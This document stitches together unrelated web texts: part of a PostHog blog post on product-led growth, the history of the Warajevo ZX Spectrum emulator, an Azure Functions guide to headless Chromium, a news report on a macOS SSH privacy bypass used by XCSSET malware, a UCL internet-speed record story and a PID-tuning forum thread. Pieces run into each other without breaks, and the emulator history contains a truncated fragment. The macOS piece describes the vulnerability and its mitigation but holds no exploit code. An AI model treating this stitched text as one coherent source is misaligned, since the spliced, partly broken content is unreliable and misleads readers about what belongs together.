<p>Now, following a PLG approach does not substitute having a Sales or Marketing team. It just means growth is <em>led</em> by the product, and the other teams in the organization operate in alignment with this methodology. </p>
<p>Additionally, operating a B2B company without a Sales team does become impractical at a large scale. We would know, since our founders used to close software sales deals in the seven figures.</p>
<h2 id="the-key-is-in-the-dna"><a href="#the-key-is-in-the-dna" aria-label="the key is in the dna permalink"></a>The Key is in the&nbsp;DNA</h2>
<p>While this "strategy" sounds more like common sense than a methodical approach, there's more to Product-led growth than meets the eye.</p>
<p>To truly succeed as a business that drives growth primarily through its product, this concept needs to be built into the company culture.</p>
<p>While Sales and Marketing can often work well as segregated teams that draw from the product but operate independently in practice, focusing on building a product is an organization-wide effort.</p>
<p>As <a href="https://www.productled.org/foundations/what-is-product-led-growth">PLGC</a> put it, different teams often operate in different wavelengths, but with Product-Led Growth, you need everyone to converge into one single wavelength: user experience.&nbsp;</p>
<p>At PostHog, we follow a Product-led Growth approach. And we'll tell you, this has implications for all areas of the company:</p>
<h3 id="sales"><a href="#sales" aria-label="sales permalink"></a>Sales</h3>
<p>Don't make a sale if your product is not a good fit for the customer.&nbsp;</p>
<p>From the first paragraph of <a href="https://posthog.com/handbook/growth/sales">PostHog's Handbook Sales page</a>:</p>
<blockquote>
<p>Always focus on delivering what the customer needs. Sometimes that will mean sending them to a competitor or turning them&nbsp;down.</p>
</blockquote>
<p>Yes, this is literally an official guideline for doing Sales at PostHog.</p>
<h3 id="team"><a href="#team" aria-label="team permalink"></a>Team</h3>
<p>If you're a software company, PLG might mean opting for more Engineers than Sales people, for instance. In our case, we still don't have a single person doing Sales or Marketing exclusively. Almost our entire team is made up of Engineers, including people not working day-to-day on our codebase.&nbsp;</p>
<p>More than with other approaches, you also need to make sure your hires are individuals who understand and are passionate about the product, as well as are proactive in making it better.&nbsp;</p>
<p>Your Sales people shouldn't cut corners to close a deal, and the Marketing team should focus on highlighting the product you built.</p>
<h3 id="communication"><a href="#communication" aria-label="communication permalink"></a>Communication</h3>
<p>Listen to your users on everything.</p>
<p>Built something? Get feedback. New idea? Get feedback. Launched a release? Get feedback.</p>
<p>As one of our <a href="https://twitter.com/mariusandra">core devs</a> put it following interviews with users about a new feature he built: "Your assumptions are mostly wrong. Talk to people to correct them".</p>
<p>When generating growth primarily through Sales or Marketing, the segregation between the people who are building the product and those selling it can lead to diversion between what users want and what is being offered to them.</p>
<p>When focusing on the product, you should always be touching base with your users, and be willing to drop features you love if they don't feel the same way.</p>
<h3 id="priorities"><a href="#priorities" aria-label="priorities permalink"></a>Priorities</h3>
<p>At PostHog, our methodology is:</p>
<blockquote>
<p>If we keep our team first and users second, then our investors will take care of themselves!</p>
</blockquote>
<p>Users are key and should be a top priority.</p>
<p>However, you must remember that your team consists of the first users of your product, its main advocates, and its builders!&nbsp;</p>
<p>Hence, since users are a priority, and the team takes care of the users, you need to take care of your team!</p>
<h3 id="growth"><a href="#growth" aria-label="growth permalink"></a>Growth</h3>
<p>Since you're not aggressively seeking out users with Product-Led Growth, you are likely to experience slower growth at first.&nbsp;
Later on, however, if you did truly build something great, you may benefit from a network effect that skyrockets your userbase.&nbsp;</p>
<p>Facebook and Slack are great examples of this.&nbsp;</p>

<p>Facebook, in fact, actually grew fast early on, while following a primarily PLG approach. This goes on to show that it is possible
to grow fast despite following a Product-led Growth approach, or, perhaps even because of it. When you're an industry disruptor, your product speaks for itself, since it is something new, rather than an improvement on something that already exists. As such, your product can potentially drive your growth even if you don't explicitly follow a PLG strategy.</p>
<p>Tesla is another example of a company that lets its disruptive product do the talking. They reportedly spend a <a href="https://www.forbes.com/sites/johnkoetsier/2019/05/06/tesla-spends-zero-on-ads-heres-where-bmw-toyota-ford-and-porsche-spend-digital-ad-dollars/#4a574ec911d4">whopping 0$ on advertising</a>, yet have a brand that is known worldwide, and a <a href="https://finance.yahoo.com/quote/TSLA/">stock price that seems to just keep on rising</a>. </p>
<h3 id="revenue"><a href="#revenue" aria-label="revenue permalink"></a>Revenue&nbsp;</h3>
<p>Since the initial focus is on building a product rather than selling it, you will likely make less money in the short-run.</p>
<p>With the goal not being to hit a Sales metric, you might be turning down opportunities to generate revenue if they are not perfectly aligned with what you're building.</p>
<p>As such, you need to make sure your team and investors are aligned with this. It should be understood that <a href="https://posthog.com/blog/raising-3m-for-os">it's okay to not be making money in the early stages</a>.</p>
<h2 id="one-size-doesnt-fit-all"><a href="#one-size-doesnt-fit-all" aria-label="one size doesnt fit all permalink"></a>One Size Doesn't Fit&nbsp;All</h2>
<p>Product-Led Growth is not a magic pill. It does have its shortcomings.</p>
<p>Primarily, how can you let your product speak for itself if you can't get anyone to look at it in the first place?</p>
<p>But rather than tell you when Product-led Growth might not work, let's explore some aspects that may be beneficial to it.</p>
<h3 id="funding"><a href="#funding" aria-label="funding permalink"></a>Funding</h3>
<p>It's much easier to focus almost exclusively on building a product when you're already well-funded. This is our case at PostHog.</p>
<p>To build a great product, you need a great team. And to build a great team, you need money.&nbsp;</p>
<p>Thus, if you're a company without a lot of money in the bank, you might just need to get some Sales done now, simply to fund your operations.</p>
<p>Not having funding shouldn't discourage you from trying a PLG approach, however. It can still work, just look at GitLab. They first raised money after already having 100,000 users and Sid (their CEO) <a href="https://posthog.com/blog/a-chat-with-sid">told us</a> they didn't even have a significant marketing budget until then. Wow.</p>
<h3 id="open-source-software"><a href="#open-source-software" aria-label="open source software permalink"></a>Open Source&nbsp;Software</h3>
<p>Being open source is a great characteristic for companies looking to follow a PLG approach.&nbsp;</p>
<p>This is because you can get users excited not only about the usability of your product, but also how it's built.</p>
<p>Additionally, open source software projects by default encourage community participation, since anyone is able to suggest a change, raise an issue, or even contribute code.&nbsp;</p>
<p>As such, you are more involved with your users and can gain better insight into how people feel about your product.</p>
<h3 id="breadth-of-experience"><a href="#breadth-of-experience" aria-label="breadth of experience permalink"></a>Breadth of Experience</h3>
<p>With regards to professional experience, depth refers to extensive experience in a specific field, whereas breadth can be seen as experience across fields.</p>
<p>Depth of experience is an essential characteristic of a world-class team. However, having some focus on breadth can also be beneficial. …</p></div></div>

Maybe this program is not too interesting in itself, but it is a fact
that this program comes from Bosnia and Herzegovina, from the city of
Sarajevo which has been surrounded for more than three years (click at the
picture below to learn more about surrounded Sarajevo). After reading this
story, you will understand why this emulator has such strange
name "Warajevo"...

<p>
Even in our secondary school days, about ten years before, we began to build an
interest in computers thanks to the ZX Spectrum. For this reason, we are a
bit sentimentally tied with this computer. This computer reminds us of all of
the times when, in our neighbourhoods, the life was nice and normal.

<p>
When we bought AT 286 computers at the end of 1990, we did not forget our
Spectrums however. We had great interest when, in June 1991, we got a
Spectrum emulator, which, without underestimating anybody's work, had very
bad characteristics (it was slow, quite incompatible with the original
machine, with unpractical emulation of the tape recorder etc.). It's origin
is unknown to us (we suppose, in according to some newspapers, that the program
is from the Slovenia Republic, and that the author is Peter Kroselj), and when
starting it displays the copyright message '(C) 1991. Roman &amp; easy inc.'. When
the war started in our country, we wanted to remove the dark thoughts from our
heads as much as possible. So, in April 1993, we started the development of our
Spectrum emulator, symbolically called 'Warajevo Spectrum emulator' which should
have much better characteristics. We should mention that we were known as quite
good programmers, especially in assembly language.

The program was developed in horrible conditions. The grenades fell
everywhere, there was little electrical power (at one time even the
hospitals didn't have power for two months!). When we had electricity it was
only for 2-3 hours during the night. However, we did not quit and caught
every moment when the electricity was on to develop the program. Zeljko worked at
home on his 80286/12 MHz, 1.44" floppy, 40 Mb hard disc, Hercules card and Citizen
180D printer. He used TASM assembler. It was very interesting waiting for days of
electricity. Samir worked mainly in army camp barack on 80286/16 MHz, 5,25" + 1.44"
floppy, 2400 bps modem, VGA mono monitor, WITHOUT HARD DISC because it crashed. The power
generator in the army camp was an improvised generator, with a voltage that varied from
150 V to 300 V! It was in fact car engine without carburator, connected to natural gas
pipeline. This car engine was tied with shunted electromotor giving about 30 kW for
100 rooms.

<p>
It was often situation that when one user switch caffe aparat on, Samir's
computer resets itself. UPS? What is this??? As you can expect, such 'stable' voltage
distroyed Samir's hard disc...
</p>
<center>

</center>

<p>
Zeljko's task was mainly writting of the emulator kernel, and Samir's task was to write
conversion and tape file utilities. So, he used Turbo Pascal 5.5. First version of such
utility was called ZXTOOLS, and existed up to release 1.5. In this situation, we decided
that our tape file format will be compressed, as we had not enough diskettes, nor we
belived that we will ever have money for puchasing bigger hard disc.

As Zeljko has real Spectrum 128, we made cable for transfering Spectrum software using
RS232. During times when we was free of army activities, Samir visited the last Spectrum
software pirate in Sarajevo and borrowed casettes. But, this pirate was located in one
of the most dangerous places in the city, practically on the first front line. He had to
use a river bed (instead of streets) for moving, to skip continous sniper's fire. So, Samir
risked his life to bring up Spectrum software! Later he transfered programs using RS232,
mainly in the army camp.

<p>
The summer of 1993 was the worst period during the whole Bosnian war, 1 kg of sugar had
price of even 60 DM, and about 3000-4000 grenades fall every day on the town. This was a
period when only miracle saved Sarajevo of fall. However, we progressed very well...

Zeljko catched every second of presence of electrical power to finish the emulator
kernel, and Samir hed not even leave the army building during this period. While he
waited for a new battle tasks, he developed the compression algorythm. He spent more
than 30 days in developing algorythm, analysing of some archivers, optimizing
compression speed (it is still slow, but acceptable), and he worked mostly on paper,
because it was days mainly without any electric power, water and food.
Keep in mind that in this period we lost about 1 kg weekly!

<p>
In November 1993, reading some newspapers that came from the enemy's territory, we got
some information about the emulator 'Z80', written by Gerton Lunter. The fact that we
didn't hear about Lunter's 'Z80' earlier is a fortune for today Warajevo users, because we
very probably would not even start this project if we have had information that a good
quality Spectrum emulator already exists. But, in even worse winter conditions,
we continued the development (in the rooms where we slept the water was frozen), hoping to
get this emulator to compare our program and his program.

(40M) into the computer , and Samir developed ZXSHELL (the database program for the
emulator written in Clipper). In April 1994, the foundation Sorosh opened the first
electronic mail in Sarajevo. We sent a general request and in June 1994, we got
Lunter's emulator. From documentation we got information about many Spectrum emulators
around Europe, but we thought that our program was surely better than all the others,
except maybe Lunter's program. We think that it is a great success, considering the
conditions where the program was developed and the quality of Gerton's program. When
we contacted Gerton, he had the same opinion about it.

The first public release of the Warajevo emulator was sent to the world at end of
1994 (release 1.0). Other releases made during war was 1.1 (March 1995), and 1.11
(May 1995). This was just a bugfixes of release 1.1 with slight improvements.

Dayton peace came (November 1995), and we was released from army. Release 1.2 was
prepared for uploading. It was 1.1 with a new design of utility ZXTOOLS. This release
was finished in December 1995. But, Samir decided to improve the emulator to be his
<a href="https://worldofspectrum.net/features/warajevo/diplom.zip">graduate thesis</a>
(Zeljko already finished study, he graduated in January 1995), and he
puchased 486SX-33 board, 4 Mb of RAM and 400 Mb hard disc. Zeljko continued development
on his old 286 machine, but Samir had now enough power to compile programs using extended
memory and we released version 1.5 (in July 1996) after Samir's graduating and getting
job. In this release, utilities ZXTOOLS and ZXSHELL are not separate tools. Instead, they
are integrated into the environment of the emulator.

Release 2.0 was developed in much better conditions. The war is finished, but the
economical situation is terrible. Our payments was under 50 DM. However, Zeljko
succeed to purchase faster computer, and he finally had goal to develop accurate speed
version of the Warajevo kernel. So, we worked on Pentium 133 MHz/1.2 Gb disc and Pentium
100 MHz/1.6 Gb hard disc, both
with 16 Mb of RAM, Sound Blaster cards and VGA graphic card (this is mainly our today
configuration too). First real-time release of Warajevo, release 2.0, was uploaded in
February 1998. As you can see, Warajevo 2.0 is
uploaded after a long delay (about nearly 1.5 year) from previous release. This is mainly consequence of
adaptation to post-war conditions. Finishing of the war brings a lot of new problems
which took a lot of our time, so developing of the emulator was stopped for a while...
</td></tr></tbody></table>
<p>
The last release of Warajevo is currently Warajevo 2.51. Recently, a number of new
emulators have appeared. Some of them are very good, especially X128 by James McKay,
and there are a number of emulators for the Windows platform (we want to point out ZX32
by Vaggelis Kapartzianis and MultiMachine by Paul Hodgson). However, we still think that
Warajevo 2.51. is the best emulator for pure DOS. We want to tell you that
the Warajevo emulator still does not have a good emulation of the video
system like in the ZX32 emulator (although it is much better than in release
2.0. which was a considerable improvment itself over release 1.5.), perfect
emulation of the bits 3 and 5 in the F register, emulation of the disc
interfaces, Multiface 128, AMX mouse, full emulation of the RS232 socket or
emulation of the Spectrum +3, which are supported in some other emulators.
However, we want to emphasize that Warajevo still has a lot of features which make it
unique. For more details see:

Well, what do you think, after this story, about today MS Windows programs that
require 100 Mb for relative simple task??? Obviously, the Spectrum times were the
best computer times. Nowadays, for playing a game in a PC you need a Pentium 200 MHz,
32 Mb of RAM and a fast graphic card. If you haven't got these requirements, you can`t
play the game. But, with the Spectrum everything was quite different. The Spectrum
wasn't upgradeable and the programmers had to make big efforts to develope a very good
game. And the games were also cheaper than the PC ones...

August 21, 2020 | https://anthonychu.ca/post/azure-functions-headless-chromium-puppeteer-playwright/ | <a href="https://web.archive.org/web/*/https://anthonychu.ca/post/azure-functions-headless-chromium-puppeteer-playwright/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>With a recent update to Azure Functions, it is now possible to run headless Chromium in the Linux Consumption plan. This enables some serverless browser automation scenarios using popular frameworks such as <a href="https://github.com/puppeteer/puppeteer">Puppeteer</a> and <a href="https://playwright.dev/">Playwright</a>.</p>

<h2>Browser automation with Puppeteer and Playwright</h2>

<p>Browser automation has been around for a long time. Selenium WebDriver was a pioneer in this space. More recently, Puppeteer and Playwright have gained in popularity. The two frameworks are very similar. Google maintains Puppeteer and Microsoft maintains Playwright. It's interesting to note that some of the folks who worked on Puppeteer are now working on Playwright.</p>

<p>Puppeteer and Playwright each support a different set of browsers. Both of them can automate Chromium. They automatically install Chromium and can use it without extra configuration.</p>

<h2>Azure Functions support for headless Chromium</h2>

<p>It's been a challenge to run headless Chromium on Azure Functions, especially in the Consumption (serverless) plan. Until now, the only way to run it has been by using a custom Docker image on the Premium plan.</p>

<p>Very recently, the necessary dependencies to run headless Chromium were added to the Azure Functions Linux Consumption environment. This means that we can simply <em>npm install</em> Puppeteer or Playwright in a Node.js function app to start using one of those frameworks to interact with Chromium.</p>

<h2>Use Puppeteer and Playwright in Azure Functions</h2>

<p>It's pretty straightforward to run either Puppeteer or Playwright in Azure Functions. We use npm to install it. Note that because it is needed at run-time, we should install the package as a production dependency. In the examples below, we use Puppeteer/Playwright with headless Chromium in an HTTP triggered function to open a web page and return a screenshot.</p>

<h2>Deploy to Azure</h2>

<p>Since we're deploying to a Linux environment, we have to make sure we run <em>npm install</em> in Linux so it downloads a version of Chromium that matches the deployment target. Thankfully, Azure Functions supports remote build so that the app is built in the correct Linux environment during deployment, even though we might be developing locally in macOS or Windows.</p>

<h3>Configuring VS Code for remote build</h3>

<blockquote>
<p>If we are deploying using Azure Functions Core Tools, we can skip this step.</p>
</blockquote>

<p>By default, the Azure Functions VS Code extension will deploy the app using local build, which means it'll run <em>npm install</em> locally and deploy the app package. For remote build, we update the app's <em>.vscode/settings.json</em> to enable <code>scmDoBuildDuringDeployment</code>.</p>
<div><pre><code data-lang="json"><span>{</span><span>
    </span><span>"azureFunctions.deploySubpath"</span><span>:</span><span> </span><span>"."</span><span>,</span><span>
    </span><span>"azureFunctions.projectLanguage"</span><span>:</span><span> </span><span>"JavaScript"</span><span>,</span><span>
    </span><span>"azureFunctions.projectRuntime"</span><span>:</span><span> </span><span>"~3"</span><span>,</span><span>
    </span><span>"debug.internalConsoleOptions"</span><span>:</span><span> </span><span>"neverOpen"</span><span>,</span><span>
    </span><span>"azureFunctions.scmDoBuildDuringDeployment"</span><span>:</span><span> </span><span>true</span><span>
</span><span>}</span><span>
</span></code></pre></div>
<p>We can also remove the <code>postDeployTask</code> and <code>preDeployTask</code> settings that runs npm commands before and after the deployment; they're not needed because we're running the build remotely.</p>

<p>And because we're running <em>npm install</em> remotely, we can add <code>node_modules</code> to <em>.funcignore</em>. This excludes the <em>node_modules</em> folder from the deployment package to make the upload as small as possible.</p>

<h3>Creating a Linux Consumption function app</h3>

<p>We can use any tool, such as the Azure Portal or VS Code, to create a Node.js 12 Linux Consumption function app in Azure that we'll deploy the app to.</p>

<h3>Configuring Chromium download location (Playwright only)</h3>

<p>By default, Playwright downloads Chromium to a location outside the function app's folder. In order to include Chromium in the build artifacts, we need to instruct Playwright to install Chromium in the app's <em>node_modules</em> folder. To do this, create an app setting named <code>PLAYWRIGHT_BROWSERS_PATH</code> with a value of <code>0</code> in the function app in Azure. This setting is also used by Playwright at run-time to locate Chromium in <em>node_modules</em>.</p>

<h3>Publishing the app</h3>

<p>If using VS Code, we can use the <em>Azure Functions: Deploy to Function App...</em> command to publish the app. It'll recognize the settings we configured earlier and use remote build.</p>

<p>If using Azure Functions Core Tools, we need to run the command with the <code>--build remote</code> flag:</p>
<div><pre><code data-lang="bash">func azure functionapp publish <span>$appName</span> <span>--build</span> remote
</code></pre></div>
<p>And that's it! We've deployed a consumption Azure Functions app that uses Puppeteer or Playwright to interact with Chromium!</p>

<p>A privacy bug lurking around in Apple Mac OS X since at least 2018 continues to remain unpatched.</p>



<p>The severity of the bug could be considered <em>moderate</em>, as the attacker would first need to establish an SSH connection to the system. However, it forms one of the Improper Authorization exploits actively leveraged by the <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/xcsset-mac-malware-infects-xcode-projects-performs-uxss-attack-on-safari-other-browsers-leverages-zero-day-exploits/" target="_blank" rel="noreferrer noopener">XCSSET Mac Malware</a>, described in <em>TrendMicro’s</em> report.</p>



<p>XCSSET malware targets XCode projects, altering them in such a way, that they execute malicious code on building. </p>



<p>In a technical brief PDF provided by <em>TrendMicro</em>, the “Data Vault vulnerability used in Safari cookie theft” specifically refers to this very SSH vulnerability. </p>



<p>The bug was previously discovered and reported by Howard Oakley in his <a href="https://eclecticlight.co/2018/11/12/who-put-that-in-my-full-disk-access-list-ssh-and-mojaves-privacy-protection/" target="_blank" rel="noreferrer noopener">blog</a> post titled <em>“Who put that in my Full Disk Access list?”</em></p>



<p>In fact, security engineer Mikey (<a href="https://twitter.com/0xmachos/status/1296064717098811392" target="_blank" rel="noreferrer noopener">0xmachos</a>) wasted no time in calling out <em>TrendMicro</em> for not referencing Oakley in their report.</p>



<figure></figure>



<p>Oakley explained how in certain cases, macOS would automatically give <code>ssh</code> <strong>Full Disk Access </strong>to a connected user, effectively bypassing their privacy settings.</p>



<figure><img loading="lazy" src="https://eclecticlightdotcom.files.wordpress.com/2020/08/ssh02.jpg?w=940" alt="ssh02" width="580" height="509"><figcaption><strong>macOS Full Disk Access list contains “sshd-keygen-wrapper” and “sshd”</strong><br>Source: EclecticLight blog</figcaption></figure>



<p>Typically, macOS systems are in one of the three states, with regards to SSH access:</p>



<ul><li>they were never accessed over SSH. Therefore, the&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;entry is not present in the&nbsp;<strong>Full Disk Access</strong>&nbsp;list, <strong>or</strong><br></li><li>have been accessed over SSH with Full Disk Access permission granted, due to&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;being listed and ticked, <strong>or</strong><br></li><li>accessed over SSH but permissions were now removed, with&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;listed under Full Disk Access but <strong>not ticked</strong>.</li></ul>



<p>“It is only when&nbsp;<strong>Privacy</strong>&nbsp;settings are in the last state that access to protected data will be refused. The only control that the user has is enabling and disabling the&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;in the&nbsp;<strong>Full Disk Access</strong>&nbsp;list, which has the effect of toggling access to protected data for that user,” stated Oakley in his original blog post.</p>



<p>Moreover, removing the <code>sshd-keygen-wrapper</code> from the Full Disk Access list didn’t prevent access to protected data at all!</p>



<div><p>This means, ideally when in the first state, macOS should<em> by default</em> <em>prevent</em> granting access to areas specified by “sshd-keygen-wrapper,” should the setting had been ticked. But that isn’t the case.</p><p>Unchecking “sshd-keygen-wrapper” from the list is acceptable, and works as intended. But removing it altogether will actually add it back into the list in a “ticked” state.</p></div>



<h2>Consequences? Exploited at large.</h2>



<p>This means a user accessing macOS over SSH will now have full permissions and privileges offered as if this option was ticked. This directly concerns the user’s privacy.</p>



<p>“To gain full access to any privacy-protected directory, all an attacker has to do is establish an ssh connection. Provided Remote Login is enabled, and <code>sshd-keygen-wrapper</code> <strong>isn’t both present and disabled (unticked)</strong> in the Full Disk Access list, macOS will automatically bypass its own privacy protection without any further control,” states Oakley in his latest <a href="https://eclecticlight.co/2020/08/20/the-vulnerability-in-remote-login-ssh-persists/" target="_blank" rel="noreferrer noopener">post</a>.</p>



<p>This behaviour can be exploited by malware and sophisticated “vulnerability chaining” exploits to steal sensitive files, such as Safari browser cookies.</p>



<figure><img loading="lazy" width="1024" height="712" src="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png" alt="" srcset="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png 1024w, https://securityreport.com/wp-content/uploads/2020/08/image-2-300x209.png 300w, https://securityreport.com/wp-content/uploads/2020/08/image-2-768x534.png 768w, https://securityreport.com/wp-content/uploads/2020/08/image-2.png 1248w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png 1024w, https://securityreport.com/wp-content/uploads/2020/08/image-2-300x209.png 300w, https://securityreport.com/wp-content/uploads/2020/08/image-2-768x534.png 768w, https://securityreport.com/wp-content/uploads/2020/08/image-2.png 1248w" data-src="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>



<p>“macOS protects the Safari cookie file <code>~/Library/Cookies/Cookies.binarycookies</code> with the System Integrity<br>Protection (SIP) feature. However, we found a bypass method when analyzing the malware’s <code>safari_cookie</code> module. It is a zero-day vulnerability exploitation that is at large,” reads <em>TrendMicro’s</em> technical brief on XCSSET.</p>



<h2>Remediating what’s <em>not a “zero-day”</em></h2>



<p>While <em>TrendMicro</em> refers to this vulnerability as a “zero-day,” not all experts agree.</p>



<p>For example, Thomas Reed, Director of Mac and Mobile at Malwarebytes told <em><a href="https://portswigger.net/daily-swig/apple-security-sophisticated-mac-malware-targets-developers" target="_blank" rel="noreferrer noopener nofollow">The Daily Swig</a></em>:</p>



<p>“The Data Vault vulnerability is definitely not a zero-day, as it’s been known for a couple of years that using SSH/SCP bypasses TCC restrictions. This is a known issue, but it’s been known since 2018 and may, at this point, be something that Apple considers to be working as intended.”</p>



<p>Oakley’s recommendation advice comes in two measures which would make it harder for attackers to exploit this bug:</p>



<p>“Disable <strong>Remote Login</strong> and ensure that <code>sshd-keygen-wrapper</code> has been added to your Mac’s <strong>Full Disk Access</strong> list but is <strong>unticked</strong> there.”</p>



<p>Until Apple patches this privacy <em>omission</em> in their OS X builds, the vulnerability may continue to be exploited as a part of advanced attacks on Apple systems.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-10413"><div><div><div><h2>UCL engineers set new world record internet speed by achieving a mindboggling 178,000Gbps speed aka 178Tbps</h2><p>The current generation thrives on the Internet and its speed. The normal speed we have in our home is about 10 to 100Mbps but just imagine what will happen if you have a download speed of 178,000 gigabits per second on your home Wi-Fi network. You could download the entire Netflix library of movies/serials and TV shows in just under a second. Mind-blowing isn’t it!</p><p>Researchers from University College London have achieved the impossible speed of 178Tbps during their research. The importance of UCL researchers’ achievement can be surmised from the fact that the current optical fiber-enabled data centers are capable of transmitting data at speeds of 35Tbps. The existing world record for maximum Internet speed was set by an Australian research team at 44.2Tbps in May this year. But all these records pale in light of the mind-boggling speed that UCL researchers have achieved.</p><p>A team of researchers from University College London led by Dr. Lidia Galdino in collaboration with Xtera and KDDI Research has succeeded in achieving 4 times the speed of Australian researchers’ earlier world record.</p><p>The researchers have published a <a href="https://www.ucl.ac.uk/news/2020/aug/ucl-engineers-set-new-world-record-internet-speed">blog post</a> explaining how they achieved the world record Internet speed of 178,000Gbps. The researchers say that they used wavelengths much wider than those used in existing fiber optic systems and a spectral bandwidth of 16.8 THz. To understand the bandwidth used by the researchers, we can compare it with the currently used networks which use 4.5 THz bandwidth. The next-gen 9THz bandwidth is just being implemented in some parts of the world.</p><p>To achieve this spectral bandwidth, the researchers combined different amplifier technologies needed to boost the signal power over this wider bandwidth and maximized speed by developing new Geometric Shaping (GS) constellations or patterns of signal combinations that make the best use of the phase, brightness and polarization properties of the light. They were able to manipulate the properties of each individual wavelength to get the desired spectrum. By using a system-tailored set of geometrically shaped constellations, the UCL engineers demonstrated the transmission of 660 ×25 GBd channels over 40 km, resulting in a record single-mode fiber net throughput of 178.08 Tbit/s.</p><p>The researchers say that the data transmission rate of 178 terabits a second (178,000,000 megabits a second) could take less than an hour to download the data that made up the world’s first image of a black hole (which, because of its size, had to be stored on half a ton of hard drives and transported by plane).</p><p>Interestingly the Internet transmission speed achieved by UCL researchers is very close to the theoretical limit for data transmission given by the American mathematician Claude Shannon in 1949.</p><p>While the earlier research was limited to labs, UCL research could actually be commercialized says Dr.Gadlino, “While current state-of-the-art cloud data-center interconnections are capable of transporting up to 35 terabits a second, we are working with new technologies that utilize more efficiently the existing infrastructure, making better use of optical fiber bandwidth and enabling a world record transmission rate of 178 terabits a second.”</p><p>The UCL team’s research was funded by the Royal Academy of Engineering, The Royal Society Research Grant, and the EPSRC program grant. The team has written a research paper on their achievement called the <a href="https://ieeexplore.ieee.org/abstract/document/9144561"><strong>IEEE Photonics Technology Letters</strong></a>.

<p>Hi</p>
<p>I would appreciate you help to undertake a useful test of your site. I have a RTK GPS differential drive robot that uses pure persuite controller to steer to a track between waypoints. It uses the error between the aimpoint and actual gps heading. We record lates longs and many other data values. We drive the robot by applying different wheel speeds to the drive wheels. We use a hardware controlled close loop PID to ensure the wheels drive at the correct speed.. We also measure the cross track error but we do not use this as yet in the actual controller. What specific data do we need for your simulator to worl</p>

<p>Hi,</p>
<p>I am guessing you mean how to obtain the input/output data required in the first step of the PID Tuner.</p>
<p>If that is the case, then you need to find where the PID code is executed (if is a PLC then find the PID block). Then record:</p>
<p>The&nbsp;output&nbsp;of the PID block is what the PID Tuner needs for the&nbsp;input&nbsp;column.<br>
The&nbsp;input&nbsp;of the PID block (which is the process measurement) is what the PID Tuner needs for the&nbsp;output&nbsp;column.<br>
The&nbsp;time&nbsp;of the experiment.<br>
As you see input and output are&nbsp;inverted&nbsp;between the PID block and what the Tuner expects.</p>
<p>Now to obtain the experiment data : With the PID block&nbsp;turned off, execute an experiment by making a manual step change on the PID output (what would be the Tuner input) and record all the data of that experiment. If you can make more steps, the better. Try steps up and down if possible. Then load that data into the PID Tuner.</p>
<p>Once you load that data, save your project and share your link here, so I can further assist you.</p>

<p>Many thanks for your reply. I am looking forward to getting my data into your tuner as I am sure I will then get a better understanding of the whole system. Currently I do have quite a few gaps in my control theory knowledge</p>

<p>I am enclosing a data file that we record from each robot mission.</p>
<p>I am also enclosing 2 drawing to explain what we are attempting to do with the pure pursuit PID We first start with 2 waypoints. The robot calculates the heading to a point on the straight line between the 2 way points at is a fixed distance from the robot. As the robot moves the aim point is continuously recalculated.</p>
<p>We then calculate a heading to this aimpoint and from the RTK dual antenna gps we determing an accurate heading of the robot. The difference in the angle between the aimpoint and the gps heading (error) is fed into the PID controller on an Arduino Due.</p>
<p>The output of the controller is a turnSpeed. This turnSpeed is then added to a constant forwardSpeed of 550 to formulate a left and right wheel speed. So if both L and R wheel speeds are 550 the robot drives straight. As the turnspeed increases in one direction so does the differential between the 2 wheels speeds. The wheelspeeds are fed to the Roboteq MDC2230 motor controller with a number from -1000 to +1000 and this generates a voltage to the wheel motors. The application of the differential voltage caused the robot to drive forward and if required drive in a direction to reduce the error between the Aimpoint and GPS to ZERO</p>

<p>So the input to the controller is the difference between aimpoint and gps heading The output of the PID controller is a turnSpeed which is modified to by 2 wheelspeeds.</p>
<p>These wheelspeeds then cause the robot to drive in some direction until the whole system is updated</p>

<p>The loop time for the PID is 5 Hz. We print the data for the excel every second however we can increase that to 5 Hz as well</p>

<p>If you can use the info I have provided to help me select the correct data for your tuning model I would be very grateful.</p>

<p>Also not sure how to do a step impulse for this system. A little clarity on this will also be appreciated.</p>

<p>Hi,</p>
<p>The input to the pidtuner should be the “TurnSpeed” and the output should be the “GPS Heading”. I tried to import your data to the pidtuner using the “Loop Timer” as the time, but divided by 1000 to get the seconds.</p>
<p>Sadly your data does not contain clean manual steps on the input (TurnSpeed). These should be performed in open-loop (PID turned off). Some steps up and down while recording the output (GPD Heading).</p>
<p>Still the pidtuner gave somewhat of a match, see the following link:</p>
<p><a href="https://pidtuner.com/#/0eDJOt49JM" rel="nofollow">https://pidtuner.com/#/0eDJOt49JM</a></p>

<p>I would try some conservative PID gains first like the ones shown in the link, then if it works, move the slider right to mak the PID gains gradually more agressive.</p>
<p><img src="https://forum.pidtuner.com/wp-content/uploads/hm_bbpui/47/8to1jdamx8sbwggmptgrtpwfue631v1n.PNG" alt="Conservative PID gains"></p>
<p>Still the bets thing to do would be to repeat the experiment, providing some clean steps on the “TurnSpeed”.</p>

<p>Really appreciate your assistance. Please continue to have patience with me as I am new to all this. I want to continue as I want to learn as much about this as possible</p>
<p>OK The purpose of this robo is to drive a predetermined course. The coirse consists of parallel tracks separated by the width of the robot. The spreadsheet that I enclosed was based on a autonomously operated robot mission driven by a microprocessor. The steering is controlled by a pure persuit PID. The input to the PID is GPS-Aim point heading (or other way round I can not remember) and the output is as you said turnSpeed. The turnspeed is then approtioned to the left and right wheels, If the error between the GPS and AIM point is 0 then turnspeed is 0 and the robot drives straight at the constant forward speed of 550. if the error is plus or minus and is non zero the robot will turn to the left or right as turnSpeed will be also non 0.</p>
<p>The robot is supposed to drive between 2 way points marked as A and B in the drawings. This is the desired track.&nbsp; We measure the cross track error and is is the distance the robot is off the desired track. Currently the cross track error (CTE) is not used in a PID to further reduce the error and to get the robot to better follow the desired track.</p>
